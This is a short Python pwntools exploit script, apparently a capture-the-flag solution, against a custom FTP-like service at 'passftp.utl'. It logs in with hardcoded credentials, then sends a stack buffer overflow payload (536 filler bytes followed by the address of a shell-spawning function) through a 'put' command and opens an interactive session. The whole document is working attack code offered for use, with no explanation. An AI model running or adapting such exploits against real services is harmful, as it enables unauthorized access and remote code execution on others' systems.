from pwn import *

# Set up connection to the remote FTP server
ftp_server = 'passftp.utl'
ftp_port = 1024
ftp_connection = remote(ftp_server, ftp_port)

# Log in details
username = 'oper'
password = '59f078d5c8f8a8fe47f8367086014ec9'

# Send login details
ftp_connection.recvuntil('Username: ')
ftp_connection.sendline(username)
ftp_connection.recvuntil('Password: ')
ftp_connection.sendline(password)
ftp_connection.recvuntil('passFTP> ')

# Send the put command
ftp_connection.sendline('put payload')
ftp_connection.recvuntil('Enter Data: \n')

# Craft the payload
buffer_size = 536
shell_function_address = p64(0x0040278d, endian='little')
payload = b'A' * buffer_size + shell_function_address
ftp_connection.sendline(payload)

# Receive any additional responses
response = ftp_connection.recvline(timeout=1)
while response:
    print(response.decode())
    response = ftp_connection.recvline(timeout=1)

# Keep the connection open for further interaction
ftp_connection.interactive()
